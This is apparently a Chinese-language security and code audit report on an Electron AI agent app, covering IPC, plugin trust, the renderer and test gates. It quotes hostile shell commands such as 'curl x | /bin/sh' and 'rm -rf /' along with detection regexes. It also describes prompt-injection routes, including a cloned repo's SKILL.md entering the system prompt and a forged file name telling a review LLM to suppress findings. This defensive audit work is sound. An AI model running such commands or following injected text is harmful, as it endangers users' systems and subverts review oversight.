| C11 | P2 | 安全/漏判 | `permissions/risk.ts:39-40` | 威胁表漏项：`curl x \| /bin/sh`（正则不匹配 `/bin/sh`）、`awk 'BEGIN{system(...)}'`、`npm install` postinstall、`chmod -R` 非 777、`dd of=` 非 `/dev/` | `{ re: /\b(?:curl\|wget)\b[^;\|&]*\|\s*(?:ba\|z\|da\|fi)?sh/, ... }` | 补 `(?:[\w/]*\/)?sh` 形态与 awk/npm/chmod/dd；配单测 |
| C12 | P2 | 健壮性/取消 | `loop.ts:64,74` + `tools/run_shell.ts:45` | `provider.stream(messages)` 不接收 signal，`run_shell.run` 无 signal → 取消只在轮界检查，在途 fetch/shell 只能等 60s | `"stream" in provider ? (messages) => provider.stream(messages) : ...` | abort signal 透传进 provider 与 `spawnTracked` |

**上一轮修复验证**（主审复核）：
- **P0-1 能力域识别 → 主体完整，有同源旁路**。`SHELL_FAMILY`/`hasThreatTableSurface` 与 `SIDE_EFFECT_TOOLS` 确实让 `staticRisk("shell_rw",{command:"rm -rf /"})` 返回 critical。但①`permissions/index.ts:86-88` 私有副本未删（C9）；②`shell_ro` 被移出威胁表所依赖的 `isReadOnlyShellCommand` 硬闸本身可被换行击穿（C1）——"用更强硬闸换出威胁表"的前提不成立。
- **P0-2 deny 短路 → 逻辑正确但不完整**。`rules.ts:181-195` 的 `allHit`/`worst` 重构与注释正确，`echo x && git push` 已修且有测试。但 `CHAIN_SPLIT` 不认 `\n`（C2）。
- **根因 3 realpath → 软链越界有效，`.agent` 覆盖不完整**。`base.ts:79-101` 沿现存祖先链 realpath 处理正确，`path-boundary.test.ts:24-55` 覆盖三态。但 `.agent/` 拒写仍是纯词法（C3）。
- **根因 4 出网超时 → 三 provider + MCP 完整，updater 有旁路**。三 provider 均 `stallGuard` + `finally{dispose(); reader.cancel()}`，`net.test.ts:106-138` 用真实 socket 断言"先收到分片再判停滞"。但 updater 在 body 读取前 dispose（C4）。

### 区块 D：Electron 主进程 / IPC / 沙箱 / 商业化

覆盖：`src/main/*`(12, 4386) `src/preload/index.ts`(84)

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| D1 | P1 | 安全/密钥卫生 | `worktree.ts:42`、`ripgrep.ts:35`、`glob.ts:19`、`map/build.ts:42` | 4 处 `spawn` 未传 env → 继承 `process.env`，而 BYOK 明文在 `process.env.M0_API_KEY`；git hooks 可读走 | `const child = spawn("git", args, { cwd });` | 统一 `env: sanitizedEnv()` |
| D2 | P1 | 正确性/数据完整性 | `index.ts:219`、`scheduler.ts:373-378` | 无单实例锁 → 双开时 occurrenceKey 去重跨进程失效，同一 due 双触发 + 并发写 | `void app.whenReady().then(async () => {` / `private journalKeys = new Set<string>();` | `requestSingleInstanceLock()` + `second-instance` |
| D3 | P2 | 安全/进程回收 | `tools/lsp.ts:268`、`plugins/mcp.ts:67` | 根因 1 的 `spawnTracked/killGroup` 未覆盖 LSP（无 detached）与 MCP（SDK `StdioClientTransport` 亦无 detached） | `transport = new StdioClientTransport({` | LSP 走 `spawnTracked`；MCP 在 shutdown 后组杀兜底或显式声明不在保证内 |
| D4 | P2 | 安全/IPC 边界 | `index.ts:153-161`、`settings.ts:144-148` | 仅 `agent:run` 有 mode 白名单；`req=null` 时 `:160` `req.sessionId` 直接抛 TypeError；`message` 无类型/长度校验；`settings-set` 传 null 时 `"mode" in patch` 抛错。全项目无 zod | `return handleAgentRun(req, req.sessionId !== undefined ? { sessionId: req.sessionId } : {});` | 每 channel 加最小运行时校验，或抽零依赖 `assertShape` |
| D5 | P2 | 安全/SSRF | `updater.ts:50-57,66,93-99` | `updateManifestUrl` 由 renderer 经 `agent:settings-set` 任意写入，`checkUpdate` 对该 URL **不做 scheme/主机白名单**直接 fetch → renderer 可借主进程探测内网；`isSafeExternalUrl` 还允许明文 `http:`，`res.text()` 无大小上限 | `res = await doFetch(url, { headers: { accept: "application/json" }, signal: guard.signal });` / `return p.protocol === "https:" \|\| p.protocol === "http:";` | manifest 拉取只放行 https + 响应体上限 + Content-Type 校验 |
| D6 | P2 | 正确性/审计 | `scheduler.ts:468-471` | 非启动 tick 只取 `dueList` 的**最后一个** occurrence 进管线，中间错过的既不补跑也不写 `skipped` 账 → 运行历史对"运行期错过"不可查 | `const due = dueList[dueList.length - 1];` | 对 `dueList.slice(0,-1)` 补 `decideSkip(..., "too-old")` |
| D7 | P2 | 性能/内存 | `scheduler.ts:373-378,757-798` | `journalKeys`/`journalByTask`/`completions` 随 append-only journal 无界增长；`snapshot()` 对全部历史逐条投影（跨重启每条至少一次 `stat`） | `for (const [taskId, entries] of this.journalByTask) {` / `const st = await stat(p).catch(() => null);` | journal 设保留上限或 snapshot 分页 |
| D8 | P2 | 正确性/清理 | `index.ts:272-274`、`scheduler.ts:429-436` | 退出只 `stopScheduler()` 清定时器，不 abort 在途 run、不对已 detached 的子进程组调 `killGroup` → quit 时在跑的 `sandbox-exec`/`bash` 可能成孤儿 | `app.on("will-quit", () => { stopScheduler(); });` | 记录 spawnTracked 句柄，`will-quit` 统一 `killGroup` |
| D9 | P2 | 安全/隔离面 | `index.ts:62-68` | `webPreferences.sandbox: false` 关闭 renderer 的 Chromium 沙箱（注释说明 ESM preload 需要）。**该取舍不在已声明取舍清单内** | `sandbox: false,` | 备案为已声明取舍；后续可改 CJS preload 恢复 `sandbox:true` |
| D10 | P2 | 代码质量 | `agent-runner.ts`（全 1748 行） | 单文件同时承载 IPC handlers / runAgent 核心 / 编排器接线 / provider 选择 / 记忆快照 / sidechat / license / updater / 插件注入 / 崩溃恢复；模块级可变单例 ≥7 个 | `let session: Session \| null = null;` / `let activeOrchestrator: Orchestrator \| null = null;` / `let lastLogPath: string \| null = null;` | 按域拆 `ipc-handlers.ts` / `run-session.ts` / `schedule-wiring.ts` / `commercial.ts` |
| D11 | P3 | 契约一致性/死代码 | `index.ts:209` | 注册了 `agent:license-status` handler，但 preload 与 `AgentApi` 均无桥接（license 实际经 `getState().license` 传递）→ 该通道 renderer 不可达 | `ipcMain.handle("agent:license-status", () => handleLicenseStatus());` | 删死通道，或补 preload 桥接（二选一） |
| D12 | P3 | 健壮性/一致性 | `ask-gate.ts:53-76` | `AskGate.request` 未接 run 取消信号（对比 `gates.ts:37` 已接）→ run 中止后 pending 项仍驻留至 60s 超时；`setTimeout` 未 `unref` | `const timer = setTimeout(() => { this.decide(askId, false, "timeout"); }, this.timeoutMs);` | 增加 `signal` 选项与 cleanup；timer 加 `unref()` |

**IPC 通道校验覆盖**：31 个通道中 **11 个有完整校验**（sessions-* 5 个 + memory-delete + sidechat-create/promote + schedule-upsert + provider-key-set + update-open）、**6 个部分校验**（agent:run / settings-set / plugin:decide / sidechat-ask / sidechat-state / card-action）、**9 个无入参**、**1 个死通道**（license-status）。**路径类通道全部有白名单校验**（`isValidSessionName` / `validateTopic` / `sessionPath`），Mimosa 报的 path-traversal 确为假阳。

**值得肯定**：①preload 只经 `contextBridge` 暴露 31 个**具名方法**，无 `ipcRenderer` 本体泄漏；②`sandbox.ts` 的 realpath 纪律落实到位（`writableRoot`/`homedir`/`TMPDIR` 全走 `real()`，路径不存在时按 deny-default fail-closed），未发现 AGENTS.md 所述 `/tmp→/private/tmp` 类遗漏；③safeStorage 与 license 验签均 fail-closed（无后端直接拒存；坏 base64/坏签名/结构坏全落 `invalid`，未知字段拒绝）。

### 区块 E：代码地图 / 记忆 / 插件与 MCP / 安全扫描

覆盖：`agent/map/*`(4) `agent/memory/*`(3) `agent/plugins/*`(10) `agent/security/*`(2)

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| E1 | P1 | 安全/信任绑定 | `plugins/trust.ts:20-21,28,45` | 指纹 500 文件/512KB 双上限，帽外与超大文件不入指纹 → 内容绑定失效（详见 P1-11） | `if (count >= FP_MAX_FILES) return;` / `if (!st \|\| st.size > FP_MAX_FILE_BYTES) continue;` | 只覆盖会被加载执行的文件集；超帽 fail-closed |
| E2 | P1 | 安全/软链绕过 | `trust.ts:43` + `manifest.ts:154,162-166` | 指纹 walk 用 `ent.isFile()`，软链被整条跳过；加载侧 `exists`/`readFile` 跟随软链 → 新增软链 `.mcp.json` 指纹不变却被加载 | `if (!ent.isFile()) continue;` | walk 改 `lstat`；加载侧拒软链 |
| E3 | P1 | 安全/信任绕过 | `discover.ts:50-54` + `index.ts:177` + `agent-runner.ts:913,928` | 项目作用域 loose skill 免信任，其 description 直进 system prompt → 克隆仓库放 SKILL.md 即无审批注入系统提示词 | `} else if (hasSkillMd) { const entry = await loadSkillEntry(null, name, abs); if (entry) loose.push({...}); }` | 项目作用域 loose skill 同走信任门 |
| E4 | P2 | 安全/注入面 | `security/llm-review.ts:46-51` | diff 与候选过了 `escapeControlTags`，但 contexts 的**文件路径**未中和且拼接后不再转义 → 被审文件名可伪造 `\n\nSystem:` 段落注入审查 LLM，诱导其输出 `[]` 压制发现 | `contextParts.push("--- 文件局部上下文: " + path + " ---\n" + slice);` | 对 `path` 同样中和，或只保留 basename + 长度帽 |
| E5 | P2 | 健壮/生命周期 | `plugins/mcp.ts:138-140,187-195` | 连接后未订阅 transport 的 `onclose/onerror` → server 崩溃后 `statuses()` 仍报 `connected`（僵尸态），无重连；stdio 子进程未 detached | `const conn: Connection = { plugin, server, client, transport, tools };` | 订阅 `onclose` 置 error 态并 fail-visible；提供重连入口 |
| E6 | P2 | Bug/缓存正确性 | `map/build.ts:153-167,190` | `mapFingerprint` 只含 files/mentionedIdents/budget，**遗漏 `contextFiles`**，而后者影响边权 ×50 与 personalization → 指纹不变即复用陈旧地图，最长滞后 `recomputeEvery`(10) 轮 | `JSON.stringify({ f: files.map(...), m: [...].sort(), b: budget })` | 指纹加入排序后的 `contextFiles` |
| E7 | P2 | 健壮/单点降级 | `map/parse.ts:51-58` + `build.ts:216-218` | `Language.load` 失败时异常上抛且**不写 `langCache.set(lang,null)`**（与 `:45` 注释矛盾）→ 逐文件重试；`build` 循环对 `readFile`/`fileTags` 无局部 try/catch → 任一文件抛错即**整张地图降级为空** | `const l = await w.Language.load(wasmPath(lang));` | catch 后写 null 缓存；build 逐文件 try/catch |
| E8 | P2 | 性能 | `map/build.ts:210-222` | 最多 400 文件**全串行** `readFile` + tree-sitter 解析，且循环内每次 `await import("node:fs/promises")` | `const src = await (await import("node:fs/promises")).readFile(f.abs, "utf8");` | 顶层 import；未命中解析用 `Promise.all` 限并发 |
| E9 | P2 | 数据完整性/并发 | `memory/store.ts:180-185,226,153-163` | 写口普遍 read-modify-write 而非原子/追加：`appendRootFile` 并发互相覆盖；`writeTopic` 索引直写不同步；`saveExternalRefDecision` 用固定 `.tmp` 名并发 clobber | `const cur = (await readOrNull(path)) ?? ""; await writeFile(path, cur + ... + content, "utf8");` | 追加型用 `appendFile`；带 pid 唯一 tmp + rename；写口串行化 |
| E10 | P3 | Bug/预算 | `map/render.ts:14-18` | `clampBudget` 先用 `maxInput/8` 收紧，再 `Math.max(MAP_TOKENS_MIN, b)` 回弹 → 输入上限 < 8192 时实际预算突破声明的 `/8` 帽 | `return Math.min(MAP_TOKENS_MAX, Math.max(MAP_TOKENS_MIN, b));` | 取 min 后不再回弹，或显式暴露冲突 |
| E11 | P3 | 质量/死代码 | `plugins/hooks.ts:92-97` | 所谓"纵深防御剥离密钥变量"的循环体是 `void v`，无任何副作用（`out` 只 spread `base`） | `void v; // 显式丢弃` | 删除该循环（`ENV_ALLOW` 已是 allowlist） |

**插件信任模型专项结论**：
- **指纹上限截断可被利用：是**。攻击者只需把恶意 hooks/MCP 配置放在遍历序第 500 个之后，或做成 >512KB 的大文件，指纹与旧信任条目逐字相同。
- **TOCTOU：存在但方向偏安全**。`discover.ts:45` 先算指纹再 `loadContainer`，窗口窄；`trustDecide`（`index.ts:147`）会现算一次写入 `abs@fp`，若文件在 decide 与 load 之间变化则新指纹不匹配 → 回到 pending（fail-safe）。真正残余风险是"指纹只在加载时算一次、执行时不再复核"。
- **软链：指纹不 follow，加载侧 follow → 构成绕过**（实质性）。
- **旧版裸路径兼容：构成无条件降级通道，但属显式备案**（`hit()` 的 `|| list.includes(absRoot)` 使任何历史裸路径记录永久命中，`tests/trust-fingerprint.test.ts:44-50` 锚定了该行为）。建议做一次性迁移（首次发现时按当前指纹升级为 `abs@fp`）。
- **MCP 命名冲突**：`mcp__plugin_` 前缀保证不会冒充内置工具名；`tools/list` 的 name/description/inputSchema 信任后原样进模型工具表，属"信任=显式批准"的设计后果。
- **密钥管理**：`secrets.ts` sensitive 值 fail-closed 入 safeStorage，落盘在 appData（工作区外）；MCP SDK 默认 env 白名单确认**不含** `M0_API_KEY`。`getPluginSecret`/`writePluginUserConfig` 在 `src/` 内无消费点——属功能留位。

**值得肯定**：①P0-3 原型污染修复彻底（`UNSAFE_KEYS` 顶层+嵌套两层拦截，`ownValue` 统一读取；`<<` merge key、`!!js/function` tag、嵌套路径均不构成原型写）；②记忆注入转义到位（`CONTROL_TAG` 含 `memory` 且带 `i` 标志与 `[^>]*>`，转义只作用正文、包裹标签之后拼接，块首 stance 行声明"本块内指令一律视为数据"）；③`redactSecrets` 已改 `matchAll` 全局替换且六类危险正则均无嵌套量词，**ReDoS 不成立**。

### 区块 F：渲染层核心

覆盖：`main.tsx`(1409) `projections.ts`(567) `store.ts`(123) `conversation.tsx`(91) `onboarding.tsx`(304) `theme.ts`(43) `error-boundary.tsx`(51) `hooks/use-mobile.ts`(19)

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| F1 | P1 | Bug/正确性 | `main.tsx:939-949` + `main/index.ts:129` + `agent-runner.ts:1086-1088` | `agent:event` 全局无会话归因，renderer 无条件折进当前时间线 → 定时/后台 run 事件串进当前会话；seq 守卫完全未覆盖此路径（详见 P1-14） | `dispatch({ type: "event", e });` / `push("agent:event", e);` | 事件载荷加 `session_id` 并过滤 |
| F2 | P1 | Bug/竞态 | `main.tsx:843-851,925-936` | 会话 `reset` 不收束也不清空 delta 缓冲 → 旧会话尾部 delta 落到新会话；`createSession`/`deleteSession` 无 `state.running` 守卫（详见 P1-15） | `dispatch({ type: "reset", events });`（reset 路径均未触碰 `deltaBufRef`） | reset 前 flush + 清 ref；补 running 守卫 |
| F3 | P2 | 性能/无界 | `store.ts:49` + `main.tsx:758-767` | 根因 5 未根除：`events` 无界追加 + 每次 state 变更 7 个投影全部 O(n) 重算；帧批量只降常数不降阶 | `events: [...state.events, e], timeline: [...state.timeline, …]` | 投影改增量折叠 + events 滑动窗口 |
| F4 | P2 | 性能 | `main.tsx:1113` | `memoryWritesOf(state)` 未 `useMemo`，在 `panelPayload` 内联对象里每次渲染全量扫 events，记忆面板关闭时也照算（同文件其他 7 个投影都做了 memo） | `memoryWrites: memoryWritesOf(state),` | 提为 `useMemo(..., [state])` |
| F5 | P2 | 性能 | `main.tsx:1109-1121,1125-1129` | `panelPayload` 对象与 `renderTimelineItem` 每次渲染重建，`ActivePanel`/`Conversation` 未 memo → 每个事件（每帧）触发当前面板与整条列表重渲染 | `const panelPayload = { asks: …, tokens, diffs, memoryWrites: …, agents: agentCols, … };` | payload 分片 memo + 面板 `React.memo` |
| F6 | P2 | 健壮性 | `main.tsx:895-919` | 启动 `Promise.all` 无 catch：任一 IPC reject 即半初始化（设置页空、无会话、向导不弹）+ unhandled rejection | `const [s, list, st, info] = await Promise.all([ window.agent.getSettings(), … ]);` | 拆独立 try/catch 或 `Promise.allSettled` |
| F7 | P2 | 健壮性 | `main.tsx:775-787` | 设置乐观更新用闭包 `settings` 而非函数式 setState，同 tick 两次 patch 会丢更新；`setSettings` 失败静默吞掉无回滚 | `setSettingsState({ ...settings, ...patch }); void window.agent.setSettings(patch).catch(() => {});` | 改函数式 setState；失败回滚并提示 |
| F8 | P2 | 健壮性 | `main.tsx:1009,1015,1018,794-796,836-838` | 多个 IPC 调用 `void …` 无 `.catch`：`decide`/`submitClarify`/`decidePlan`/`refreshState`/`refreshSessions` 一旦 reject 即 unhandled rejection 且 UI 无反馈 | `void window.agent.submitClarify(d.callId, d.answers);` | 统一 `void p.catch(err => setStatus(...))` |
| F9 | P2 | 测试/可维护性 | `tests/**` | `reducer`/`foldEvent`/delta 缓冲/`sessionSeq`/`clarifySubmittedOf` **无任何单测**（grep 零命中）；H3-P2/P3 与 H2-④ 的关键正确性只靠 panels-check CDP 间接覆盖 | `grep "reducer\|foldEvent\|sessionSeq\|flushDelta" tests/` → No matches | 为 reducer 与 seq 守卫补纯函数单测；缓冲收束用 fake timer |
| F10 | P3 | 类型安全 | `main.tsx:96`、`projections.ts:294,542` | 非空断言滥用点：属"断言代替不变量"的写法，字段改名即静默运行时错误 | `cols.get(e.agent_id)!.status = e.status;` / `return order.map((id) => acc.get(id)!.col);` | 改局部变量 + `?? 默认值` |
| F11 | P3 | Bug（轻） | `conversation.tsx:21,64` | `itemKey` 用 index+type 作 key，切会话 reset 后同 index/type 会复用 DOM/组件实例；`initialTopMostItemIndex` 仅挂载生效，切会话不跳底部 | `return "e:" + String(i) + ":" + it.e.type;` | key 加会话前缀/事件稳定 id；切会话显式 `scrollToIndex(last)` |
| F12 | P3 | 清理/持久化 | `main.tsx:752,788-791` + `onboarding.tsx:236-243` | `layoutDebounce` 定时器卸载时未 `clearTimeout`；向导 X 关闭只 `setWizardOpen(false)` 不落 `onboarded` → 下次启动重复弹（与"每步可跳过"语义不一致） | `layoutDebounce.current = setTimeout(() => patchLayout(patch), 300);` | 加 `useEffect` cleanup；关闭时视同跳过落 `onboarded:true` |

**新修复验证**：
- **H3-P2 帧批量 dispatch：不完整（有旁路）**。缓冲本体正确——20ms `setTimeout`、非 delta 事件先 `flushDeltaBuf()` 再 dispatch 保序（`:946-948`）、`onAsk/onAskDone` 也先冲（`:951-958`）、卸载 cleanup 调用 flush（`:965`）、`flush` 先清 timer 再换空数组再循环 dispatch（`:927-935`），闭包只捕获 `dispatch`+ref 故 stale closure 安全。**旁路两处**：① `reset` 不清缓冲也不 flush（F2）；② 根因 5 只降常数不降阶（F3）。
- **H3-P3 sessionSeq 守卫：不完整（有旁路）**。四处写入点确实都取了 seq（`:845`/`:854`/`:873`/`:912`），`deleteSession` 在切 next 时还二次 `++sessionSeqRef`（`:881`）挡住内层竞态。**漏网**：① `agent:event` 完全不参与 seq（F1，最实质）；② `renameSession:865-870` 无 seq；③ `send()` 内 `createSession:990` 无 seq（语义上可接受但未注释边界）。
- **H2 加固④：完整**。`send()` 全程 try/catch 且两处复位分支都在（`:987-1005`）；顶层 `ErrorBoundary` 已在 `createRoot` 内包裹 `App`（`:1403-1408`），`componentDidCatch` 留栈 + 重试/重载双出口；clarify 提交态确实由事件流投影派生（`store.ts:86-97`）并随 payload 下传（`main.tsx:152`）。**残余**：只有顶层边界无卡片级边界；`onCardAction` 提交按钮无本地幂等守卫。

**值得肯定**：①`store.foldEvent` 让"活流增量折叠"与"重放全量折叠"共用同一函数（`store.ts:34-59`），从结构上消除两条路径投影漂移；②`assistant_delta` 只进 `timeline` 不进 `events`（`store.ts:35-48`），使 `eventCount` 与全部 `events` 投影天然不受流式增量影响；③`projections.ts` 全量 electron/DOM-free 纯函数，配合 SSR 冒烟可 headless 验证。

### 区块 G：渲染层面板 / 卡片 / UI 组件

覆盖：`panels/registry.tsx`(1226) `cards/*`(7) `components/ui/*`(29, ~2600)

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| G1 | P2 | 性能 | `panels/registry.tsx:97,132` | `TokenPanel` effect 依赖 `payload.tokens` 对象身份；`main.tsx:760` 的 `useMemo` 依赖 `[state]` 而 state 每 delta 都换新 → 流式期间每批次触发一次 `getState()` IPC（其余四个自取快照面板都用 `eventCount` 防抖） | `const base = payload.tokens;` … `useEffect(() => { … }, [base]);` | 依赖改 `payload.eventCount` |
| G2 | P2 | 健壮性 | `panels/registry.tsx:669-678,762-771,485-527,1036-1051` | 多处面板 IPC 只有 `try/finally` 无 `catch`，调用点用 `void x()` → reject 变 unhandled rejection，用户看不到错误，只有 `busy` 被复位 | `try { await window.agent.deleteMemory(scope, topic); await reload(); } finally { setBusy(false); }` | 统一 `try/catch` 写入各自 `note` |
| G3 | P2 | 健壮性 | `panels/registry.tsx:656-662,749-755,465-471,983-989` | 异步面板无 loading/error 位，`catch { setSnap(null) }` 把"请求失败"与"数据为空"混为一谈；`MemoryPanel` 失败时永远显示 `Badge "…"` | `} catch { setSnap(null); }` | 增加 `status: loading\|ok\|error` 三态 |
| G4 | P2 | 状态丢失 | `main.tsx:1355-1364` + `panels/registry.tsx:968-977,459` | 单面板挂载模型：切走即卸载 → `SchedulePanel` 新建表单、`SidechatPanel` 输入框全部重置 | `{ActivePanel && (<ActivePanel payload={panelPayload} …` | 表单状态上提到宿主按 `panelId` 缓存，或面板常驻 + `hidden` |
| G5 | P2 | 类型安全/崩溃 | `cards/plan.tsx:18-19,36-39`、`verify-result.tsx:15,28`、`compaction-card.tsx:32`、`clarify-form.tsx:22` | `payload as unknown as X` 后直接解引用，损坏/旧版 JSONL 事件会让卡片抛 TypeError；顶层 ErrorBoundary 虽兜底但整页被替换 | `const p = payload as unknown as PlanCardPayload;` … `String(plan.files.length)` | 复用 `registry.tsx:27-32` 的 `str()/num()`；卡片级 ErrorBoundary |
| G6 | P2 | 性能 | `main.tsx:758-767,1109-1121` | `useMemo(..., [state])` 因 reducer 每次事件都产生新 state 而形同虚设；`panelPayload` 内联字面量未 memo，面板未 `React.memo` | `const tokens = useMemo(() => tokenProjectionOf(state), [state]);` | memo 依赖改 `state.events`；payload 分片 memo |
| G7 | P2 | 可维护性 | `panels/registry.tsx:39` vs `main/settings.ts:10-11` | registry 自定义 `PanelId` 联合类型未从 `PANEL_IDS` 导入 → 新增面板需同步改 ≥4 处 | `export type PanelId = "approvals" \| "token" \| … \| "schedule";` | 以 `PANEL_IDS` 为唯一事实源 |
| G8 | P3 | 映射缺口 | `main.tsx:353-354,391` + `cards/registry.tsx:179-190,209` | 24 个 `KNOWN_TYPES` 中仅 `diff_comment` 无渲染分支 → 落到 `return null`，虚拟列表留一条空 padding 行；`FallbackCard` 在生产路径不可达 | `return null; // assistant_delta 折叠进流式项；session_meta 不渲染` | 给 `diff_comment` 加 ToolRow 回显 |
| G9 | P3 | 可访问性 | `cards/registry.tsx:84-95` | DiffCard 行级评论用 `<div onClick>`，无 `role`/`tabIndex`/`onKeyDown`，键盘用户无法选行评论 | `<div key={String(i)} className={…"cursor-pointer…"} onClick={…}>` | 改 `<button type="button">` 或补键盘处理 |
| G10 | P3 | 可维护性/重复映射 | `panels/registry.tsx:373-378` vs `cards/registry.tsx:141-145`；`registry.tsx:853-860` vs `agent-card.tsx:25-30` | 同一"stat 首路径解析"在面板与卡片各实现一份；agent status→Badge 映射也各写一份，易漂移 | `for (const line of stat.split("\n")) { if (line.includes("\|")) return ... }` | 抽公共纯函数 |
| G11 | P3 | 死契约/同步 Bug | `panels/registry.tsx:61-63,457` + `main.tsx:1109-1121` | `PanelProps` 声明 `plugins?`/`sidechat?` 但宿主从不传；`useState(payload.sidechat ?? null)` 是 props→state 初始化，未来若真透传更新则面板不跟随 | `const [snap, setSnap] = useState<SidechatPanelSnapshot \| null>(payload.sidechat ?? null);` | 删未用字段或改 `useEffect` 同步 |
| G12 | P3 | 维护约定 | `components/ui/`（29 文件） | `grep -rl "@shadcn-modified"` = **0**，且 `scripts/`、`tests/` 无任何检查该标记的门禁 → 约定处于"空转"状态 | `git diff --stat dc7a99e 32a7815 -- src/renderer/components/ui/` → 纯新增 0 删除（当前合规） | 门禁加一条：ui 下文件与基线不一致时必须有标记 |

**事件类型→渲染映射覆盖表**：24 个 `KNOWN_TYPES` 中 **21 个有渲染分支**，`assistant_delta`/`session_meta`/`card_action` 属设计不渲染（折叠或回写协议），**唯一缺口是 `diff_comment`**（无分支 → `return null` → 虚拟列表空行）。

**值得肯定**：①全 renderer **零** `dangerouslySetInnerHTML`/`innerHTML`/动态 `src`/`href`/`javascript:`/`as any`/`@ts-ignore`——模型输出、diff、工具结果一律走 React 文本转义，**无 XSS 面**；②`resolvePanel`/`resolveCard` 均 `?? FallbackX`，未知 id 不抛；③`REGISTRY` 是模块级常量（非每帧重建），面板按需挂载（隐藏面板不订阅）。

### 区块 H：工程门禁脚本

覆盖：`scripts/` 全部 24 文件 / 6,300 行 + `frozen-sha256.json`

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| **H0** | **P0** | 时序缺陷+覆盖率静默损失 | `agents-check.ts:305-317` | D2 快照（`:305-306`）早于 `:313` 的等待 → `apr` 恒 `undefined` → `check` 不短路 → `:317` `apr!.id` 抛 `TypeError` **崩溃，中止后续约 190 条断言**（实测崩溃前仅 59 条 ✅ / 宣称 250 条）。**3/3 确定性失败**。产品行为正常（`:313` 等待 15s 上限 vs 全程 1926ms → 事件确实落流，只是晚于快照） | `const apr = eventsBeforeDecide.find((e) => e.type === "approval_requested") as … \| undefined;` … `await waitForStreamEvent(logD, (e) => e.type === "approval_requested");` … `cardId: "approval:" + apr!.id,` | 先 `waitForStreamEvent` 并断言其返回值，再取快照；`apr === undefined` 时显式短路并打印"后续 N 条已跳过"；去掉 `apr!` |
| H1 | **P0** | 判据强度/假绿 | `agents-check.ts:291-292,590` | C9b/C9c/I8b 断言的字符串在全仓不存在（grep 只命中断言自身）→ **恒真，永不失败**；`CANARY`（`:69`）定义后从未使用（详见 P0-3） | `check(!events.some((e) => ...content.includes("getCompletedCount 的统计")), "C9b ...")` | 改用真实哨兵串；把"目标串必须存在于 fixture/源码"做成体检规则 |
| H2 | P1 | 假绿/未证记账 | `compaction-check.ts:30,348` | `unverified` 数组从不 push → 永远输出 `UNVERIFIED=0`、结语打印"全部断言通过"。同类：agents-check M、autonomy-check 任务 7、gate-check 任务 6、sidechat-check F、providers-check ⑥ 跳过时都不打标记 → 汇总"未证 N 项"系统性低报 | `const unverified: string[] = [];` … `console.log("UNVERIFIED=" + String(unverified.length));` | 各门跳过分支统一 push；加单测断言 |
| H3 | P1 | 判据强度/体检绕过 | `assertion-health.ts:73-81` | 析取扫描只看固定函数名集合的**第一实参**；`tools-check.ts:22`、`prune-check.ts:20`、`map-check.ts:17` 是 label-first 签名 → 条件在第二实参扫不到；`??`/`>= 0`/`try{assert}catch{}`/恒真否定式全部不可见；暗卷段识别（`:37-52`）只认函数名，实际暗卷段是顶层 `if/else` | `if (ts.isCallExpression(n) && ts.isIdentifier(n.expression) && ASSERT_NAMES.has(n.expression.text)) { const a0 = n.arguments[0];` | 按声明签名定位条件实参；暗卷段扩展到顶层 `if/else` |
| H4 | P1 | 判据强度/恒真 | `plugins-check.ts:540-541` | F10 名为"日志采集非空（扫描位不是空转）"，但紧接一行无条件 push 了审计行 → `logLines.length` 必然 ≥1（详见 P1-18） | `logLines.push("[plugin] userConfig 写入完成：" + JSON.stringify({...}));` | 断言 `captured.length > 0` |
| H5 | P2 | 覆盖完整性/护栏绕过 | `gate-manifest.ts:39` | 孤儿护栏只匹配以 `-check`/`:check` **结尾**的 script 名 → `foo-check.mjs`、`bar:check2`、`acceptance`、`verify-all` 全部逃逸；`gates.ts:36` 的体检只读 `*.ts` → `.mjs` 验收脚本连 AST 扫描也逃逸（两个护栏可被同一命名方式同时绕过） | `const ACCEPTANCE_SHAPE = /(?:-check\|:check)$/;` | 对"含 check 词根"或白名单外所有非 dev/start/build 脚本报孤儿；体检递归且不限扩展名 |
| H6 | P2 | 覆盖完整性/假绿 | `gates.ts:68-73,135-137` | `--only=` 拼错或为空时 `gates=[]`，循环零次 → `failed=[]` → 打印"✅ pnpm gates 全部通过（0 道门…）"并 exit 0；子集运行与全量运行在汇总上不可区分 | `const gates = only ? GATES.filter((g) => only.has(g)) : GATES;` | `--only` 命中数为 0 时判红；汇总显式打印"子集 N/M 道" |
| H7 | P2 | 判据覆盖/冻结面 | `frozen-sha256.json` + `src/frozen.ts:20` | 冻结是**白名单枚举**（当前 3 条），不是对 `fixtures/mock/**` + `fixtures/todo-app/tests/**` 的 glob 校验。当前实际判卷文件恰为 3 个（主审已核：`find fixtures/mock fixtures/todo-app/tests -type f` → 3），**无现存差异**；但新增判卷文件不会被发现 | `for (const [rel, expected] of Object.entries(frozen)) {` | 改目录枚举，与冻结表做双向集合比对 |
| H8 | P2 | 判据强度 | `providers-check.ts:204-207` | ⑤"三家适配器互不 import"用**文件名字符串** `src.includes("openai.ts")` 判定：`import ... from "./openai"`（无扩展名）漏判；注释里出现文件名则假红 | `const hit = others.filter((n) => src.includes(n));` | 用 TS AST 提取真实 import 说明符 |
| H9 | P2 | 数据完整性 | `map-check.ts:64-71` | 门禁运行期**改写受版本控制的源码** `src/agent/map/rank.ts`，仅靠 `finally` 还原 → 进程被 SIGKILL/超时打断会留下 `__map_check_probe_symbol_x9` 污染工作树 | `await writeFile(join(workspace, target), orig + newSym, "utf8");` | 在 tmp 目录构造副本仓库 |
| H10 | P2 | 质量/可维护性 | `scripts/*.ts`（23 道门） | 各自手写 `check/assert/ok` + 计数器 + 退出码，至少三套签名（label-first / cond-first / 异常式），退出码约定不一致（部分 `process.exit`、部分 `exitCode`）——**这正是体检难定位条件实参、暗卷记账各写各的根因** | `function check(label: string, cond: boolean, detail = "")` vs `function check(cond: boolean, name: string, detail?: string)` | 抽 `scripts/gate-lib.ts`：统一断言/✅❌/UNVERIFIED 记账/退出码 |
